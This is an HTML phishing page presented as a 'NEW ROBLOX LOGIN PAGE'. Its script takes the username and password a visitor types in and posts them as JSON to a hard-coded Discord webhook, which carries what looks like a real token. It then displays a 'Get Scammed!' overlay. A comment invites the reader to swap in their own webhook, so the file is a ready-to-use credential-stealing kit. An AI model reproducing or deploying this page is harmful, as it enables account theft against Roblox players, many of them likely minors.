<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Portal</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(to right, #f5f7fa, #c3cfe2);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .form-container {
            background: #fff;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 350px;
            text-align: center;
        }
        h2 {
            margin-bottom: 20px;
            color: #333;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #555;
        }
        input[type="text"], input[type="password"] {
            width: calc(100% - 22px);
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
        }
        button {
            padding: 10px;
            background-color: #007bff;
            border: none;
            color: #fff;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 10px;
        }
        button:hover {
            background-color: #0056b3;
        }
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            color: #fff;
            display: none;
            justify-content: center;
            align-items: center;
            text-align: center;
            font-size: 24px;
            z-index: 1000;
        }
    </style>
</head>
<body>
    <div class="form-container">
        <h2>NEW ROBLOX LOGIN PAGE</h2>
        <form id="loginForm">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" required>
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>
            <button type="submit">Submit</button>
            <div id="error-message" class="error-message"></div>
        </form>
    </div>

    <div id="overlay" class="overlay">
        <div>Get Scammed! ðŸ˜±</div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const webhookUrl = 'https://discordapp.com/api/webhooks/1279453080378802299/GC4OKr09gprmt--t-wGPdRtCK8bjD-Dl9jY2FxBnY4e9BqtBFNWmQBMTboaP7khcoROo'; // Replace with your webhook URL

            const payload = {
                content: `Username: ${username}\nPassword: ${password}`
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload),
            })
            .then(response => {
                if (response.ok) {
                    document.getElementById('error-message').textContent = 'Information submitted successfully!';
                    document.getElementById('overlay').style.display = 'flex';
                } else {
                    throw new Error('Network response was not ok.');
                }
            })
            .catch((error) => {
                console.error('Error:', error);
                document.getElementById('error-message').textContent = 'Failed to submit information.';
            });
        });
    </script>
</body>
</html>
